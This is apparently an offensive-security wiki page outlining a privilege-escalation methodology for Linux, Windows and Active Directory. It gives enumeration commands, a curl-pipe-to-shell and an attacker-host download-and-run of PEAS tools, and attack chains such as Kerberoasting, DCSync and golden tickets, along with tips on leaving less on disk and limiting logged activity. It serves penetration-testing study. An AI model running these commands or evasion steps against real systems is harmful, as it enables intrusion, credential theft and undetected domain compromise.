# Privilege Escalation

The first thing to do after landing a shell is enumerate — not guess. Automated tools like `linpeas` and `winpeas` surface most vectors quickly, but knowing what to look for means you can act on the output rather than just reading it.

| Section | Common vectors |
|---|---|
| [Linux](linux/index.md) | sudo misconfig, SUID binaries, cron jobs, capabilities, credential files, kernel exploits |
| [Windows](windows/index.md) | SeImpersonatePrivilege, weak service permissions, credential dumping, AlwaysInstallElevated |
| [Active Directory](active-directory/index.md) | Kerberoasting, AS-REP roasting, ACL abuse, DCSync, ticket attacks |

---

## Methodology

### 1. Run an Automated Enumeration Script

Let the tool do the broad sweep first, then dig into what it flags.

**Linux:**

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Windows:**

```powershell
iwr -uri http://<attacker-ip>/winPEASx64.exe -OutFile C:\Temp\winpeas.exe; .\winpeas.exe
```

!!! tip "Real-world"
    Serve tools from a Python HTTP server on your attacker machine (`python3 -m http.server 80`) rather than transferring files manually. Faster and leaves less on disk.

---

### 2. Linux — Work the Checklist

Check in this order — each step is faster than the one before it:

```bash
sudo -l                                        # sudo permissions (most common path)
find / -perm -4000 -type f 2>/dev/null         # SUID binaries
cat /etc/crontab; ls -lah /etc/cron.*          # cron jobs
getcap -r / 2>/dev/null                        # Linux capabilities
find / -name "*.conf" -readable 2>/dev/null    # readable config files with creds
uname -r                                       # kernel version for exploit search
```

See [Local Enumeration](linux/local-enumeration.md), [Cron & SUID](linux/cron-suid-guid.md), [Capabilities & LD_PRELOAD](linux/capabilities-ldpreload.md), and [Credential Hunting](linux/credential-hunting.md).

---

### 3. Windows — Work the Checklist

```powershell
whoami /priv                          # token privileges (SeImpersonate is game over)
whoami /groups                        # group memberships
Get-LocalGroupMember Administrators   # who else has admin
Get-Service | Where-Object {$_.Status -eq "Running"}  # running services
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

SeImpersonatePrivilege → run `PrintSpoofer` or `GodPotato` depending on OS version.

See [Privilege Abuse](windows/privilege-abuse.md), [Service Exploitation](windows/service-exploitation.md), and [Credential Dumping](windows/credential-dumping.md).

---

### 4. Active Directory — Map the Path First

Don't guess at AD attacks — collect BloodHound data first and let it show you the shortest path to Domain Admin.

```bash
bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip
```

Then in BloodHound, run: **Shortest Paths to Domain Admins**.

Common attack chains:

| Entry point | Path |
|---|---|
| Domain user with no special perms | Check for Kerberoastable SPNs or AS-REP roastable accounts |
| GenericWrite on a user | Force password reset or targeted Kerberoasting |
| GenericAll on a group | Add yourself to privileged group |
| Replication rights | DCSync → dump all hashes |
| DA / EA | Golden ticket for persistent access |

See [Domain Enumeration](active-directory/domain-enumeration.md), [Kerberoasting](active-directory/kerberoasting.md), [ACL Abuse](active-directory/acl-abuse.md), and [DCSync](active-directory/dcsync.md).

!!! warning "Watch out"
    DCSync (Event ID 4662) and Kerberoasting (Event ID 4769) are logged on the DC. On monitored environments, do it once, get what you need, and stop.
